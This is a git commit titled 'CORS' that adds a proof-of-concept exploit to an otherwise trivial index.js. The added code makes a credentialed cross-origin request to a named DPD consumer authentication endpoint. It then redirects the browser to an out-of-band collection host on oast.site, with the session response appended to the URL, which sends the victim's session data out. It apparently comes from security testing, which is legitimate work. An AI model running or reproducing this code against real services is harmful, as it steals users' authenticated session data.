86b4bdfec8aed3046eac42bde5636cfe8e094479
MacBook Pro M2 <macbookprom2@Badreddine-Belkadi.local>
2025-11-15 20:22:15 +0100

    CORS

--- index.js
+++ index.js
@@ -1,3 +1,14 @@
 console.log('Hello, World!');
 console.log('This is the index.js file.');
 console.log('Welcome to the project!');
+
+
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://apis.consumers.dpd.co.uk/auth/session',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/log?key='+this.responseText; 
+};
